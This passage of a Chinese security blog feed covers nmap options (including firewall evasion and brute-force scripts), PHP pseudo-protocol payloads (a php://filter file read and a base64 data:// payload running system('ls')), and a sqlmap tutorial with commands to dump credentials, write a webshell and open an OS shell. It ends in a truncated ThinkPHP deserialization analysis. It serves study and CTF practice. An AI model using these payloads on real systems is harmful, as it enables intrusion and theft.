<h4 id="扫描指定段例nmap-1921681261-200">扫描指定段：<code>例：nmap 192.168.126.1-200</code></h4>
<h4 id="扫描整个c段例nmap-192168126024">扫描整个C段：<code>例：nmap 192.168.126.0/24</code></h4>
<h3 id="nmap基本选项及解释">nmap基本选项及解释</h3>
<h4 id="主机发现">主机发现：</h4>
<table>
<thead>
<tr>
<th style="text-align:left">选项</th>
<th style="text-align:left">解释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">-sP（-sn）</td>
<td style="text-align:left">Ping扫描，不扫描端口</td>
</tr>
<tr>
<td style="text-align:left">-P0</td>
<td style="text-align:left">无Ping扫描</td>
</tr>
<tr>
<td style="text-align:left">-PS</td>
<td style="text-align:left">TCP SYN Ping 扫描</td>
</tr>
<tr>
<td style="text-align:left">-PA</td>
<td style="text-align:left">TCP ACK Ping 扫描</td>
</tr>
<tr>
<td style="text-align:left">-PU</td>
<td style="text-align:left">UDP Ping 扫描</td>
</tr>
<tr>
<td style="text-align:left">-PE；PP；PM</td>
<td style="text-align:left">ICMP PINg Types 扫描</td>
</tr>
<tr>
<td style="text-align:left">-PR</td>
<td style="text-align:left">ARP Ping 扫描</td>
</tr>
<tr>
<td style="text-align:left">-n</td>
<td style="text-align:left">禁止DNS反向解析</td>
</tr>
<tr>
<td style="text-align:left">-R</td>
<td style="text-align:left">反向解析域名</td>
</tr>
<tr>
<td style="text-align:left">–system-dns</td>
<td style="text-align:left">使用系统域名解析器</td>
</tr>
<tr>
<td style="text-align:left">-sL</td>
<td style="text-align:left">列表扫描</td>
</tr>
<tr>
<td style="text-align:left">-6</td>
<td style="text-align:left">扫描IPv6地址</td>
</tr>
<tr>
<td style="text-align:left">–traceroute</td>
<td style="text-align:left">路由跟踪</td>
</tr>
<tr>
<td style="text-align:left">-PY</td>
<td style="text-align:left">SCTP INIT Ping 扫描</td>
</tr>
</tbody>
</table>
<h4 id="端口扫描">端口扫描</h4>
<table>
<thead>
<tr>
<th style="text-align:left">选项</th>
<th style="text-align:left">解释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">-T</td>
<td style="text-align:left">时序扫描</td>
</tr>
<tr>
<td style="text-align:left">-T</td>
<td style="text-align:left">时序扫描</td>
</tr>
<tr>
<td style="text-align:left">-p</td>
<td style="text-align:left">端口扫描顺序</td>
</tr>
<tr>
<td style="text-align:left">-F</td>
<td style="text-align:left">快速扫描</td>
</tr>
<tr>
<td style="text-align:left">-r</td>
<td style="text-align:left">排序</td>
</tr>
<tr>
<td style="text-align:left">–top-ports</td>
<td style="text-align:left">扫描开放概率最高的1000个TCP端口</td>
</tr>
<tr>
<td style="text-align:left">–port-ratio</td>
<td style="text-align:left">扫描一定概率以上的端口</td>
</tr>
<tr>
<td style="text-align:left">-sS</td>
<td style="text-align:left">TCP SYN 扫描</td>
</tr>
<tr>
<td style="text-align:left">-sT</td>
<td style="text-align:left">TCP 连接扫描</td>
</tr>
<tr>
<td style="text-align:left">-sU</td>
<td style="text-align:left">UDP 扫描</td>
</tr>
<tr>
<td style="text-align:left">-sN；sF；sX；</td>
<td style="text-align:left">隐蔽扫描</td>
</tr>
<tr>
<td style="text-align:left">-sA</td>
<td style="text-align:left">TCP ACK扫描</td>
</tr>
<tr>
<td style="text-align:left">-sW</td>
<td style="text-align:left">TCP 窗口扫描</td>
</tr>
<tr>
<td style="text-align:left">-sM</td>
<td style="text-align:left">TCP Maimon 扫描</td>
</tr>
<tr>
<td style="text-align:left">–scanflags</td>
<td style="text-align:left">自定义扫描</td>
</tr>
<tr>
<td style="text-align:left">-sI</td>
<td style="text-align:left">空闲扫描</td>
</tr>
<tr>
<td style="text-align:left">-sO</td>
<td style="text-align:left">IP 协议扫描</td>
</tr>
<tr>
<td style="text-align:left">-b</td>
<td style="text-align:left">FTP Bounce 扫描</td>
</tr>
</tbody>
</table>
<h4 id="指纹识别">指纹识别</h4>
<table>
<thead>
<tr>
<th style="text-align:left">选项</th>
<th style="text-align:left">解释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">-sV</td>
<td style="text-align:left">版本探测</td>
</tr>
<tr>
<td style="text-align:left">–allports</td>
<td style="text-align:left">全端口版本探测</td>
</tr>
<tr>
<td style="text-align:left">–version-intensity</td>
<td style="text-align:left">设置扫描强度（0~9,默认为7）</td>
</tr>
<tr>
<td style="text-align:left">–version-light</td>
<td style="text-align:left">轻量级扫描（即强度设置为2）</td>
</tr>
<tr>
<td style="text-align:left">–version-all</td>
<td style="text-align:left">重量级扫描（即强度设置为9）</td>
</tr>
<tr>
<td style="text-align:left">–version-trace</td>
<td style="text-align:left">获取详细版本信息</td>
</tr>
<tr>
<td style="text-align:left">-sR</td>
<td style="text-align:left">RPC扫描</td>
</tr>
<tr>
<td style="text-align:left">-O</td>
<td style="text-align:left">启用操作系统探测</td>
</tr>
<tr>
<td style="text-align:left">–osscan-limit</td>
<td style="text-align:left">对指定的目标进行操作系统探测（需要配合-O或-A选项使用）</td>
</tr>
<tr>
<td style="text-align:left">-osscan-guess;–fuzzy</td>
<td style="text-align:left">推测系统识别</td>
</tr>
</tbody>
</table>
<h4 id="定时选项">定时选项</h4>
<table>
<thead>
<tr>
<th style="text-align:left">选项</th>
<th style="text-align:left">解释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">–min-hostgroup</td>
<td style="text-align:left">调整并行扫描组的大小</td>
</tr>
<tr>
<td style="text-align:left">–max-hostgroup</td>
<td style="text-align:left">调整并行扫描组的大小</td>
</tr>
<tr>
<td style="text-align:left">–min-parallelism</td>
<td style="text-align:left">调整探测报文的并行度</td>
</tr>
<tr>
<td style="text-align:left">–max-parallelism</td>
<td style="text-align:left">调整探测报文的并行度</td>
</tr>
<tr>
<td style="text-align:left">–min-rtt-timeout</td>
<td style="text-align:left">调整探测报文超时</td>
</tr>
<tr>
<td style="text-align:left">–max-rtt-timeout</td>
<td style="text-align:left">调整探测报文超时</td>
</tr>
<tr>
<td style="text-align:left">–initial-rtt-timeout</td>
<td style="text-align:left">调整探测报文超时</td>
</tr>
<tr>
<td style="text-align:left">-host-timeout</td>
<td style="text-align:left">放弃低速目标主机</td>
</tr>
<tr>
<td style="text-align:left">–scan-delay</td>
<td style="text-align:left">调整探测报文的时间间隔</td>
</tr>
<tr>
<td style="text-align:left">–max-scan-delay</td>
<td style="text-align:left">调整探测报文的时间间隔</td>
</tr>
</tbody>
</table>
<h4 id="逃避防火墙ids">逃避防火墙/IDS</h4>
<table>
<thead>
<tr>
<th style="text-align:left">选项</th>
<th style="text-align:left">解释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">-f</td>
<td style="text-align:left">报文分段</td>
</tr>
<tr>
<td style="text-align:left">–mtu</td>
<td style="text-align:left">指定偏移大小（偏移量必须是8的倍数）</td>
</tr>
<tr>
<td style="text-align:left">-D 【decoy1，decoy2… or RND:number】</td>
<td style="text-align:left">IP欺骗（进行版本检测或TCP扫描时无效）</td>
</tr>
<tr>
<td style="text-align:left">-sI</td>
<td style="text-align:left">源地址欺骗</td>
</tr>
<tr>
<td style="text-align:left">–source-port</td>
<td style="text-align:left">源端口欺骗</td>
</tr>
<tr>
<td style="text-align:left">–data-length</td>
<td style="text-align:left">指定发包长度</td>
</tr>
<tr>
<td style="text-align:left">–randomize-hosts</td>
<td style="text-align:left">目标主机随机排序</td>
</tr>
<tr>
<td style="text-align:left">–spoof-mac</td>
<td style="text-align:left">MAC地址欺骗（0：随机生成一个MAC地址，MAC Address：手动指定一个MAC地址，Vendor Name：从指定厂商生成一个MAC地址）</td>
</tr>
</tbody>
</table>
<h4 id="信息收集">信息收集</h4>
<table>
<thead>
<tr>
<th style="text-align:left">选项</th>
<th style="text-align:left">解释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">–script ip-geolocation-*</td>
<td style="text-align:left">IP信息搜集</td>
</tr>
<tr>
<td style="text-align:left">whois</td>
<td style="text-align:left">whois查询</td>
</tr>
<tr>
<td style="text-align:left">http-email-harvest</td>
<td style="text-align:left">搜集E-mailxnxi</td>
</tr>
<tr>
<td style="text-align:left">hostmap-ip2hosts</td>
<td style="text-align:left">IP反查</td>
</tr>
<tr>
<td style="text-align:left">dns-brute</td>
<td style="text-align:left">DNS信息sbji</td>
</tr>
<tr>
<td style="text-align:left">membase-http-info</td>
<td style="text-align:left">检索系统信息</td>
</tr>
<tr>
<td style="text-align:left">smb-securi-mode.nse</td>
<td style="text-align:left">后台打印机服务漏洞</td>
</tr>
<tr>
<td style="text-align:left">smb-check-vulns.nse</td>
<td style="text-align:left">系统漏洞扫描</td>
</tr>
<tr>
<td style="text-align:left">http-stored-xss.mse</td>
<td style="text-align:left">扫描web漏洞</td>
</tr>
<tr>
<td style="text-align:left">snmap-win32-services</td>
<td style="text-align:left">通过Snmap列举Windows服务/账户</td>
</tr>
<tr>
<td style="text-align:left">dns-brute</td>
<td style="text-align:left">枚举DNS服务器的主机名</td>
</tr>
<tr>
<td style="text-align:left">http-headers/http-sitemap-generator</td>
<td style="text-align:left">HTTP信息搜集</td>
</tr>
<tr>
<td style="text-align:left">ssl-enum-ciphers</td>
<td style="text-align:left">枚举SSL密钥</td>
</tr>
<tr>
<td style="text-align:left">ssh-hostkey</td>
<td style="text-align:left">SSH服务密钥信息探测</td>
</tr>
</tbody>
</table>
<h4 id="nmap数据库渗透测试">nmap数据库渗透测试</h4>
<table>
<thead>
<tr>
<th style="text-align:left">选项</th>
<th style="text-align:left">解释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">mysql-databases</td>
<td style="text-align:left">MySQL列举数据库</td>
</tr>
<tr>
<td style="text-align:left">mysql-variables</td>
<td style="text-align:left">列举MySQL变量</td>
</tr>
<tr>
<td style="text-align:left">mysql-empty-password</td>
<td style="text-align:left">检查MySQL密码</td>
</tr>
<tr>
<td style="text-align:left">mysql-brute</td>
<td style="text-align:left">审计MySQL密码</td>
</tr>
<tr>
<td style="text-align:left">mysql-audit</td>
<td style="text-align:left">审计MySQL安全配置</td>
</tr>
<tr>
<td style="text-align:left">oracle-brute</td>
<td style="text-align:left">审计Oracle密码</td>
</tr>
<tr>
<td style="text-align:left">ms-sql-brute</td>
<td style="text-align:left">审计MSSQL密码</td>
</tr>
<tr>
<td style="text-align:left">ms-sql-empty-password</td>
<td style="text-align:left">检查MSSQL空密码</td>
</tr>
<tr>
<td style="text-align:left">ms-sql-tables</td>
<td style="text-align:left">读取MSSQL数据</td>
</tr>
<tr>
<td style="text-align:left">ms-sql-xp-cmdshell</td>
<td style="text-align:left">MSSQL执行系统命令</td>
</tr>
<tr>
<td style="text-align:left">pgsql-brute</td>
<td style="text-align:left">审计Pgsql密码</td>
</tr>
</tbody>
</table>
<h4 id="nmap渗透测试">nmap渗透测试</h4>
<table>
<thead>
<tr>
<th style="text-align:left">选项</th>
<th style="text-align:left">解释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">http-brute</td>
<td style="text-align:left">审计HTTP身份验证</td>
</tr>
<tr>
<td style="text-align:left">ftp-brute</td>
<td style="text-align:left">审计ftp服务器</td>
</tr>
<tr>
<td style="text-align:left">http-wordpress-brute</td>
<td style="text-align:left">审计WordPress程序</td>
</tr>
<tr>
<td style="text-align:left">http-joomla-brute</td>
<td style="text-align:left">审计Joomla程序</td>
</tr>
<tr>
<td style="text-align:left">pop3-brute</td>
<td style="text-align:left">审计邮件服务器</td>
</tr>
<tr>
<td style="text-align:left">smb-brute.nse</td>
<td style="text-align:left">审计SMB口令</td>
</tr>
<tr>
<td style="text-align:left">vnc-brute</td>
<td style="text-align:left">审计VNC服务器</td>
</tr>
<tr>
<td style="text-align:left">smtp-brute</td>
<td style="text-align:left">审计SMTP服务器</td>
</tr>
<tr>
<td style="text-align:left">stuxnet-detect</td>
<td style="text-align:left">检测Stuxnet蠕虫</td>
</tr>
<tr>
<td style="text-align:left">snmp-netstat；snmp-processes；snmp-win32-services；snmp-brute</td>
<td style="text-align:left">SNMP服务安全审计</td>
</tr>
</tbody>
</table>
<h4 id="nmap技巧">nmap技巧</h4>
<table>
<thead>
<tr>
<th style="text-align:left">选项</th>
<th style="text-align:left">解释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">–send-eth</td>
<td style="text-align:left">发送以太网数据包</td>
</tr>
<tr>
<td style="text-align:left">–send-ip</td>
<td style="text-align:left">网络层发送</td>
</tr>
<tr>
<td style="text-align:left">–privileged</td>
<td style="text-align:left">嘉定拥有所有权</td>
</tr>
<tr>
<td style="text-align:left">–interactive</td>
<td style="text-align:left">在交互模式中启动</td>
</tr>
<tr>
<td style="text-align:left">-V</td>
<td style="text-align:left">查看nmap版本号</td>
</tr>
<tr>
<td style="text-align:left">-d</td>
<td style="text-align:left">设置调试级别</td>
</tr>
<tr>
<td style="text-align:left">–packet-trace</td>
<td style="text-align:left">跟踪发送接受的报文</td>
</tr>
<tr>
<td style="text-align:left">–iflist</td>
<td style="text-align:left">列举接口和路由</td>
</tr>
<tr>
<td style="text-align:left">-e</td>
<td style="text-align:left">指定网络接口</td>
</tr>
<tr>
<td style="text-align:left">-oG</td>
<td style="text-align:left">继续中断扫描</td>
</tr>
<tr>
<td style="text-align:left">firewalk</td>
<td style="text-align:left">探测防火墙</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP伪协议</title>
    <url>/2022/02/25/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>PHP伪协议相关知识点在这里做个记录。</p>
<span id="more"></span>
<p>PHP常见的伪协议如下：</p>
<table>
<thead>
<tr>
<th>file://     访问本地文件系统</th>
</tr>
</thead>
<tbody>
<tr>
<td>http://    访问HTTP(s)网址</td>
</tr>
<tr>
<td>ftp://       访问FTP(s)URLs</td>
</tr>
<tr>
<td>php://     访问各个输入/输出流(I/O streams)</td>
</tr>
<tr>
<td>zlib://      压缩流</td>
</tr>
<tr>
<td>data://    数据(RFC 2397)</td>
</tr>
<tr>
<td>glob://     查找匹配的文件路径模式</td>
</tr>
<tr>
<td>phar://    PHP归档</td>
</tr>
<tr>
<td>ssh2://     Secure Shell 2</td>
</tr>
<tr>
<td>rar://         RAR</td>
</tr>
<tr>
<td>ogg://       音频流</td>
</tr>
<tr>
<td>expect://   处理交互式的流</td>
</tr>
</tbody>
</table>
<p>在这里详细说一下这个<code>php://filter</code></p>
<p>,这个是常用的伪协议，一般用于任意文件读取，有的时候也可以用在getshell，在双off的情况下也可以使用。</p>
<p>在这里举个例子</p>
<blockquote>
<p>file=php://filter/read=convert.base64-encode/resource=index.php</p>
</blockquote>
<p>关于上面这个，解释一下，首先file关键字的get参数传递，php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resourse=index.php表示目标文件为index.php。</p>
<p>上面举的常用的伪协议的用法：</p>
<p>1.php伪协议<br>
用法：<br>
<code>php://input</code>,用于执行php代码，需要post请求提交数据。<br>
<code>php://filter</code>,用于读取源码，get提交参数。</p>
<p>?a=php://filter/read=convert.<a href="https://so.csdn.net/so/search?q=base64&amp;spm=1001.2101.3001.7020">base64</a>/resource=xxx.php<br>
需要开启allow_url_fopen:php://input、php://<a href="https://so.csdn.net/so/search?q=stdin&amp;spm=1001.2101.3001.7020">stdin</a>、php://memory、php://temp<br>
不需要开启allow_url_fopen:php://filter</p>
<p>2.、data协议</p>
<p>用法：<br>
<code>data://text/plain</code>,xxxx(要执行的php代码)<br>
<code>data://text/plain;base64</code>,xxxx(base64编码后的数据)<br>
例：<br>
?page=data://text/plain,<br>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</p>
<p>3.、file协议<br>
用法：<br>
<code>file://</code>[本地文件系统的绝对路径]</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
        <category>PHP伪协议</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>PHP伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap教程</title>
    <url>/2022/04/28/sqlmap%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p><strong>之前使用sqlmap这个工具一直都没有系统的学习，有些功能没有了解到，在这里系统的学习一下一些命令作用，方便后续使用！</strong></p>
<span id="more"></span>
<h2 id="1-介绍">1 介绍</h2>
<p><a href="https://so.csdn.net/so/search?q=SQLMap&amp;spm=1001.2101.3001.7020">SQLMap</a>是一个开放源码的测试工具，它可以自动探测和利用SQL注入漏洞来接管数据库服务器。<br>
<strong>具体功能：</strong></p>
<pre><code class="hljs bash">1、判断可注入的参数
2、判断可以用那种SQL注入技术来注入
3、识别出哪种数据库
4、根据用户选择，读取哪些数据
5、可执行情况
6、当前数据库用户名称和拥有的权限
7、发现WEB虚拟目录
8、上传***getshell
9、绕过防火墙</code></pre>
<p><strong>sqlmap支持的注入模式</strong></p>
<pre><code class="hljs bash">1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
4、联合查询注入，可以使用union的情况下的注入。（适合用于通过循环直接输出联合查询结果，否则只会显示第一项结果）
5、堆查询注入，可以同时执行多条语句的执行时的注入。
12345</code></pre>
<h2 id="2-安装下载">2 安装下载</h2>
<h3 id="21-kali自带sqlmap">2.1 kali自带sqlmap</h3>
<p>可直接使用！<br>
<img src="http://img.hzy2003628.top/a630573151d84159a6c3adaa8c515632.png" alt="在这里插入图片描述"></p>
<h3 id="22-下载地址">2.2 下载地址:</h3>
<p><a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a><br>
<img src="http://img.hzy2003628.top/b791703586f3491bbc06886101a5ad6d.png" alt="在这里插入图片描述"></p>
<h2 id="3-常用请求参数">3 常用请求参数</h2>
<h3 id="31-get方法">3.1 get方法</h3>
<p><strong>对于get的请求，比较简单，直接指定目标</strong></p>
<pre><code class="hljs bash">-d： 直接连接数据库 （-d <span class="hljs-string">&quot;mysql://user:passward@地址:端口/数据库名称&quot;</span>）
-u：指定url  （?<span class="hljs-built_in">id</span>=1）
-m：将多个url保存成文件，传给sqlmap （sqlmap -m list.txt）
-r：将http头信息保存到文件，交给sqlmap
-g：google搜索出来的结果 （-g <span class="hljs-string">&quot;inurl:\&quot;.php?id=1\&quot;&quot;</span>）\&quot;只是将双引号内的<span class="hljs-string">&quot;特殊字符进行转义</span>
<span class="hljs-string">-p ：只想检查的变量</span>
<span class="hljs-string">-f ：指纹</span>
<span class="hljs-string">--users：数据库帐号</span>
<span class="hljs-string">--banner：数据库信息</span>
<span class="hljs-string"></span>
<span class="hljs-string">--dbs：有哪些数据库</span>
<span class="hljs-string">-a：all</span>
<span class="hljs-string">123456789101112</span></code></pre>
<p><strong>get请求应该是大家所熟悉的，sqlmap - u直接加URL，参数就可以了。</strong></p>
<h3 id="32-post方法">3.2 POST方法</h3>
<p>下面介绍几种对于post请求的sqlmap注入。<br>
<strong>1.使用http请求文件</strong><br>
可以用burpsuite抓包并复制到txt文件</p>
<pre><code class="hljs bash">sqlmap -r  1 .txt</code></pre>
<p><strong>2.使用burpsuite log文件 （勾选上options中的Misc中的proxy）</strong></p>
<pre><code class="hljs bash">sqlmap  - l log.txt</code></pre>
<p><strong>3.HTTPS</strong><br>
sqlmap同时也支持https的sql注入，只需加入参数-force-ssl告诉sqlmap这是https服务即可。<br>
如</p>
<pre><code class="hljs bash">sqlmap -u https://192.168.1.1/a.php?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&quot; -force-ssl  (默认不是443，在后加其端口)</span></code></pre>
<p><strong>3.–date</strong></p>
<pre><code class="hljs bash">sqlmap -u http://127.0.0.1/sqli-labs-master/Less-11/ --data=<span class="hljs-string">&quot;uname=1111&amp;passwd=11111&amp;submit=Submit&quot;</span> --dbs</code></pre>
<p>&quot;uname=1111&amp;passwd=11111&amp;submit=Submit&quot;为请求参数</p>
<h2 id="4-常用方法">4 常用方法</h2>
<h3 id="41-检测注入">4.1 检测注入</h3>
<h4 id="411基本格式">4.1.1基本格式</h4>
<pre><code class="hljs bash">sqlmap -u “http://www.vuln.cn/post.php?<span class="hljs-built_in">id</span>=1”</code></pre>
<p>默认使用level1检测全部数据库类型</p>
<pre><code class="hljs bash">sqlmap -u “http://www.vuln.cn/post.php?<span class="hljs-built_in">id</span>=1”  –dbms mysql –level 3</code></pre>
<p>指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）</p>
<h4 id="412-cookie注入">4.1.2 cookie注入</h4>
<p>当程序有防get注入的时候，可以使用cookie注入</p>
<pre><code class="hljs bash">sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “<span class="hljs-built_in">id</span>=11” –level 2（只有level达到2才会检测cookie）</code></pre>
<h4 id="413-从post数据包中注入">4.1.3 从post数据包中注入</h4>
<p>可以使用burpsuite或者temperdata等工具来抓取post包</p>
<pre><code class="hljs bash">sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql    指定username参数</code></pre>
<h3 id="42-注入成功后">4.2 注入成功后</h3>
<h4 id="421-获取数据库基本信息">4.2.1 获取数据库基本信息</h4>
<pre><code class="hljs bash">sqlmap -u “http://www.vuln.cn/post.php?<span class="hljs-built_in">id</span>=1”  –dbs</code></pre>
<p>查询有哪些数据库</p>
<pre><code class="hljs bash">sqlmap -u URL --current-db --batch</code></pre>
<p>获取当前数据库</p>
<pre><code class="hljs bash">sqlmap -u “http://www.vuln.cn/post.php?<span class="hljs-built_in">id</span>=1”  -D <span class="hljs-built_in">test</span> –tables</code></pre>
<p>查询test数据库中有哪些表</p>
<pre><code class="hljs bash">sqlmap -u “http://www.vuln.cn/post.php?<span class="hljs-built_in">id</span>=1” -D <span class="hljs-built_in">test</span> -T admin –columns</code></pre>
<p>查询test数据库中admin表有哪些字段</p>
<pre><code class="hljs bash">sqlmap -u “http://www.vuln.cn/post.php?<span class="hljs-built_in">id</span>=1” -D <span class="hljs-built_in">test</span> -T admin -C “username,password” –dump</code></pre>
<p>dump出字段username与password中的数据</p>
<p><strong>其他命令参考下面</strong><br>
<strong>从数据库中搜索字段</strong></p>
<pre><code class="hljs bash">sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</code></pre>
<p>在dedecms数据库中搜索字段admin或者password。</p>
<p><strong>读取与写入文件</strong><br>
首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
<pre><code class="hljs bash">–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）
–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）
–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</code></pre>
<blockquote>
<p>#示例：<br>
sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</p>
<p>使用shell命令：<br>
sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell<br>
接下来指定网站可写目录：<br>
“E:\php\htdocs\dvwa”</p>
</blockquote>
<p><strong>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</strong></p>
<p>转自：</p>
<p><a href="https://blog.csdn.net/WEARE001/article/details/122024378">https://blog.csdn.net/WEARE001/article/details/122024378</a></p>
]]></content>
      <categories>
        <category>Web</category>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>开启博客之旅</title>
    <url>/2021/12/29/test/</url>
    <content><![CDATA[<p>历经两天的博客搭建和美化，最终成功开启了博客之旅。下面我总结一下这次博客搭建的类型和作用，大家有意见或建议都可以在评论区提出来。</p>
<span id="more"></span>
<h1 id="博客的类型">博客的类型</h1>
<p>本博客是采用云服务器，避免花大量资金购买服务器和备案，域名为阿里云购买的.top，将博客搭载到GitHub服务器上，采用hexo构建，主体采用next主题，<s>并开启了看板娘功能(挺有趣的）</s></p>
<h1 id="博客的作用">博客的作用</h1>
<p>今后我将会在博客分享自己的学习经验和知识交流，也可以为广大网友解决问题，同时也会把我看到的觉得适合收藏的知识分享在这上面，此博客是深度交流沟通的网络新方式。</p>
<h1 id="开启博客之旅">开启博客之旅</h1>
<p>让我们一起开启博客的旅途吧！！！</p>
<p><img src="https://s2.loli.net/2022/02/19/HaJgQocUiA1Ly6F.jpg" alt="v2-254a19ed51fe3a189232fef59789d9ed_r.jpg"></p>
<p><a href="https://cn.bing.com/images/search?q=%E5%9B%BE%E7%89%87&amp;FORM=IQFRBA&amp;id=9F7FD278665203115AEF0FC3A2D0D3EC2A330CCB"><img src="https://s.cn.bing.net/th?id=OIP-C.jmp0yMKwSBZq4kxzMqKpqwHaLH&amp;w=204&amp;h=306&amp;c=8&amp;rs=1&amp;qlt=90&amp;o=6&amp;dpr=1.38&amp;pid=3.1&amp;rm=2" alt="img"></a></p>
<p><img src="https://gitee.com/hzy2003628/drawing-bed/raw/master/images/20220305114621.jpeg" alt></p>
]]></content>
      <categories>
        <category>心得</category>
      </categories>
      <tags>
        <tag>心得</tag>
      </tags>
  </entry>
  <entry>
    <title>tp6.0.13反序列化漏洞</title>
    <url>/2022/09/29/tp6%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291721537.png?x-oss-process=hzy" alt="image-20220929172159440"></p>
<span id="more"></span>
<h1 id="环境配置">环境配置</h1>
<pre><code class="hljs plaintext">composer create-project topthink/think tp6</code></pre>
<p>搭建本地环境(apache+mysql+ftp),这里需要注意php版本要求7.1+</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291723732.png?x-oss-process=hzy" alt="image-20220929172326625"></p>
<h1 id="漏洞挖掘">漏洞挖掘</h1>
<p>对于php反序列化漏洞出发点几乎都是从魔法函数走起，__destruct魔法函数极为常见，这次也是通过这个开始</p>
<p>用的是ps【phpstorm64】，ctrl+shift+f全局搜索__destruct</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291732893.png?x-oss-process=hzy" alt="image-20220929173226822"></p>
<p>其他的也都大致看了看暂时感觉没啥用，抓住这个看一下，这个可以看到this-&gt;lazySave属于可控变量，跟进save方法</p>
<blockquote>
<p>/vendor/topthink/think-orm/src/Model.php</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240835652.png?x-oss-process=hzy" alt="image-20221024083511569"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240831420.png?x-oss-process=hzy" alt="image-20221024083156322"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240840748.png?x-oss-process=hzy" alt="image-20221024084029662"></p>
<p>这里我们需要让下面这个if语句不成立，执行这个语句</p>
<blockquote>
<p>if ($this-&gt;isEmpty() || false === $this-&gt;trigger(‘BeforeWrite’))</p>
</blockquote>
<pre><code class="hljs plaintext">$result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);</code></pre>
<p>首先先看看isEmpty方法，跟进一下看看</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240842688.png?x-oss-process=hzy" alt="image-20221024084240619"></p>
<p>不难发现，this-&gt;data这又是一个可控变量，只需要满足data[]不为空就会返回false</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240845313.png?x-oss-process=hzy" alt="image-20221024084518255"></p>
<p>然后继续看第二个，跟进trigger()方法</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240846128.png?x-oss-process=hzy" alt="image-20221024084647049"></p>
<p>可以发现又是个可控变量$this-&gt;withiEvent</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240847710.png?x-oss-process=hzy" alt="image-20221024084727647"></p>
<p>设置withEvent为false，取反之后就是true就会返回true，所以此if语句两个都不成立，就会跳过判断进入想要进入的那个语句</p>
<p>这个语句中exists属于可控变量</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240849698.png?x-oss-process=hzy" alt="image-20221024084917641"></p>
<p>跟进updateData方法</p>
<p>有点长，粘下来吧</p>
<pre><code class="hljs plaintext">protected function updateData(): bool
&#123;
    // 事件回调
    if (false === $this-&gt;trigger(&#x27;BeforeUpdate&#x27;)) &#123;
        return false;
    &#125;

    $this-&gt;checkData();

    // 获取有更新的数据
    $data = $this-&gt;getChangedData();

    if (empty($data)) &#123;
        // 关联更新
        if (!empty($this-&gt;relationWrite)) &#123;
            $this-&gt;autoRelationUpdate();
        &#125;

        return true;
    &#125;

    if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime) &#123;
        // 自动写入更新时间
        $data[$this-&gt;updateTime]       = $this-&gt;autoWriteTimestamp();
        $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime];
    &#125;

    // 检查允许字段
    $allowFields = $this-&gt;checkAllowFields();

    foreach ($this-&gt;relationWrite as $name =&gt; $val) &#123;
        if (!is_array($val)) &#123;
            continue;
        &#125;

        foreach ($val as $key) &#123;
            if (isset($data[$key])) &#123;
                unset($data[$key]);
            &#125;
        &#125;
    &#125;

    // 模型更新
    $db = $this-&gt;db();

    $db-&gt;transaction(function () use ($data, $allowFields, $db) &#123;
        $this-&gt;key = null;
